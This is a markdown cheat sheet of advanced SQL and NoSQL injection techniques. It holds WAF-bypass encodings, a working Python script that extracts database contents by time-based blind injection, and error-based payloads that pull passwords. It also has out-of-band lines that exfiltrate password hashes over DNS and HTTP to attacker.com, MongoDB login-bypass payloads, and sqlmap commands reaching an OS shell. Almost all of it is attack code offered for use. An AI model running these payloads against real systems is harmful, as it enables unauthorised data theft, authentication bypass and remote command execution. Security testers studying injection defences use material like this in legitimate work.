# 💉 Advanced SQL Injection Techniques

## WAF Bypass Techniques

### Encoding Tricks

```sql
-- URL encoding
%27 OR %271%27=%271

-- Double URL encoding
%2527 OR %25271%2527=%2527

-- Unicode encoding
' OR 1=1--
\u0027 OR \u0031=\u0031--

-- Hex encoding
0x61646d696e  -- 'admin' in hex

-- Comment insertion
/**/OR/**/1=1
/*!OR*/1=1
```

### Case Variation

```sql
-- MySQL is case-insensitive for keywords
SeLeCt * FrOm UsErS wHeRe Id=1
sElEcT * fRoM uSeRs WhErE iD=1
```

### Whitespace Alternatives

```sql
-- Instead of spaces, use:
/**/          -- inline comment
%09           -- tab
%0a           -- newline
%0d           -- carriage return
+             -- (in URLs)
(1)           -- parentheses

-- Example
SELECT/**/username/**/FROM/**/users
```

## Time-Based Blind SQLi — Full Data Extraction

```python
import requests
import string
import time

def extract_char(url, query, position):
    """Extract single character using time-based blind SQLi"""
    chars = string.printable
    
    for char in chars:
        payload = f"' AND IF(SUBSTRING(({query}),{position},1)='{char}',SLEEP(3),0)-- -"
        
        start = time.time()
        response = requests.get(url, params={"id": "1" + payload})
        elapsed = time.time() - start
        
        if elapsed >= 3:
            return char
    return None

def extract_string(url, query, max_length=50):
    """Extract full string using time-based blind SQLi"""
    result = ""
    for i in range(1, max_length + 1):
        char = extract_char(url, query, i)
        if char is None:
            break
        result += char
        print(f"[+] Progress: {result}")
    return result

# Usage
url = "http://target.com/page"
db_name = extract_string(url, "SELECT database()")
print(f"[+] Database: {db_name}")
```

## Error-Based SQLi

### MySQL Error-Based

```sql
-- extractvalue() error-based
' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--

-- updatexml() error-based  
' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--

-- floor() error-based
' AND (SELECT 1 FROM (SELECT COUNT(*),concat((SELECT password FROM users LIMIT 1),floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a)--
```

### MSSQL Error-Based

```sql
-- Convert error
' CONVERT(int,(SELECT TOP 1 username FROM users))--

-- Cast error
' CAST((SELECT password FROM users WHERE username='admin') AS int)--
```

## Out-of-Band SQLi

```sql
-- MySQL DNS exfiltration (requires FILE privilege)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT HEX(password) FROM users LIMIT 1),'.attacker.com\\x'))--

-- MSSQL DNS exfiltration
'; EXEC xp_dirtree '\\attacker.com\'--

-- Oracle HTTP request
' UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE rownum=1)||'.attacker.com/">%remote;]>'),'/l') FROM dual--
```

## NoSQL Injection

### MongoDB Injection

```javascript
// Vulnerable login query
db.users.findOne({"username": username, "password": password})

// Injection payloads
// In JSON body:
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

// URL parameter injection
?username[$ne]=x&password[$ne]=x
```

## SQLi in Different Contexts

### SQLi in JSON

```json
// Test in JSON POST body
{"search": "test' UNION SELECT 1,2,3-- -"}
{"id": "1 OR 1=1"}
{"filter": "name' AND SLEEP(3)-- -"}
```

### SQLi in XML

```xml
<!-- Test in XML body -->
<search>test' UNION SELECT 1,2,3-- -</search>
<id>1 OR 1=1</id>
```

### Second-Order SQLi

```
1. Register with username: admin'--
2. This is stored safely in database
3. Application later uses stored value unsafely in another query
4. Injection fires when data is retrieved and used
```

## sqlmap Advanced Usage

```bash
# Bypass WAF with tamper scripts
sqlmap -u "URL" --tamper=between,randomcase,space2comment

# Test all parameters
sqlmap -u "URL" --level=5 --risk=3

# Use proxy (Burp)
sqlmap -u "URL" --proxy=http://127.0.0.1:8080

# Detect and bypass anti-CSRF tokens
sqlmap -u "URL" --csrf-token="csrf_token" --csrf-url="http://target.com/login"

# Enumerate users with privilege check
sqlmap -u "URL" --current-user --is-dba

# OS shell (if DBA and stacked queries)
sqlmap -u "URL" --os-shell
```
